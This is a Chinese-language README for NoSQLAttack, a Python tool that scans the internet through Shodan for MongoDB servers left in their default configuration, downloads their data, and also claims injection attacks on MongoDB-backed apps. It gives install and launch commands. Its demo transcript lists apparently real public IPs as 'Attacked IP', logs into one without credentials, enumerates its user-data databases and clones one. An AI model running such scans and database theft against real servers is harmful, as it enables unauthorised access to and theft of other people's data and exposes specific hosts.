#NoSQLAttack

#介绍
NoSQLAttack 是一个用python编写的开源的攻击工具，用来暴露网络中默认配置mongoDB的IP并且下载目标mongoDB的数据，同时还可以针对以mongoDB为后台存储的应用进行注入攻击,使用这个工具就可以发现有成千上万的mongoDB裸奔在互联网上，并且数据可以随意下载,NoSQL注入攻击测试系统[NoSQLInjectionAttackDemo](https://github.com/youngyangyang04/NoSQLInjectionAttackDemo)，这里面有两个登录系统用来测试注入攻击。
这个攻击工具是基于tcstool的[NoSQLMap](http://www.nosqlmap.net/index.html)和搜索引擎[shodan](https://www.shodan.io/)，一些攻击的数据是来自于这两篇论文给予的启发和论文里面的例子[Diglossia: Detecting Code Injection Attacks with Precision and Efficiency](http://www.cs.cornell.edu/~shmat/shmat_ccs13.pdf)和[No SQL, No Injection?](https://www.research.ibm.com/haifa/Workshops/security2015/present/Aviv_NoSQL-NoInjection.pdf)。
现在这个工具主要针对mongoDB
#运行环境
项目运行在linux系统上，NoSQLAttack的依赖包已经写在setup.py文件里，并且已经在ubantu和MAC OX上都测试了，只需要执行这个脚本就可以自动配置好安装环境
开发这个项目使用时使用的是Pycharm COMMUNITY 2016.1，python的版本为2.7.10，使用者需要在本地电脑安装[mongoDB](http://jingyan.baidu.com/article/fd8044faf4f3a95030137a79.html)。

#安装
在linux系统下可以直接将下载的项目解压，然后执行以下两个命令
```bash
cd NoSQLAttack
python setup.py install
```
#使用方法
安装完毕后，执行一下命令就可以启动该项目
```bash
NoSQLAttack
```
启动该项目后将会展现如下的界面，然后就可以开启黑客之旅了
```bash
================================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |    _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |_   | |_  | |_| | | |__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
================================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
```
#系统演示
```bash
===============================================
        _   _       _____  _____ _                      
       | \ | |     /  ___||  _  | |                     
       |  \| | ___ \ `--. | | | | |                   
       | . ` |/ _ \ `--. \| | | | |                    
       | |\  | (_) /\__/ /\ \/' / |____          
       \_| \_/\___/\____/  \_/\_\_____/                  
                                        _          
    /\      _      _                   | |  _        
   /  \   _| |_  _| |_   _____    ___  | | / /       
  / /\ \ |_   _||_   _| / __  \  / __| | |/ /        
 / /--\ \  | |    | |_  | |_| |  ||__  | |\ \       
/ / -- \ \ \___\  \___\ \______\ \___| | | \_\      
===============================================    
NoSQLAttack-v0.2
sunxiuyang04@gmail.com


1-Scan attacked IP
2-Configurate parameters
3-MongoDB Access Attacks
4-Injection Attacks
x-Exit
Select an option:1
Start Scanning.....
Results found:28793
1_Attacked IP : 149.202.88.135
2_Attacked IP : 49.212.186.80
3_Attacked IP : 85.9.62.231
4_Attacked IP : 121.78.239.11
5_Attacked IP : 54.226.207.112
6_Attacked IP : 119.254.66.44
7_Attacked IP : 121.46.0.83
8_Attacked IP : 162.243.21.180
9_Attacked IP : 210.23.29.75
Select IP to attack:2
Start Default Configuration Attack(y/n)?y
DB access attacks(mongoDB)
=========================
Checking to see if crendentials are need
49.212.186.80

27017
Successful access with no credentials!


1-Get Server Version and Platform
2-Enumerate Databases/Collections/Users
3-Clone a Database
4-Return to Main Menu
Select an attack: 2
List of databases:
MultiCopyService_UserData
SmartNFC_UserData
SmartShop_UserData
KioskPointMng2_UserData
admin
db
local

1-Get Server Version and Platform
2-Enumerate Databases/Collections/Users
3-Clone a Database
4-Return to Main Menu
Select an attack: 3


(1)MultiCopyService_UserData
(2)SmartNFC_UserData
(3)SmartShop_UserData
(4)KioskPointMng2_UserData
(5)admin
(6)db
(7)dbItem
(8)local
Select a database to steal:6
Does this Database require credentials.(y/n)?n
Database cloned. Copy another (y/n)?
```

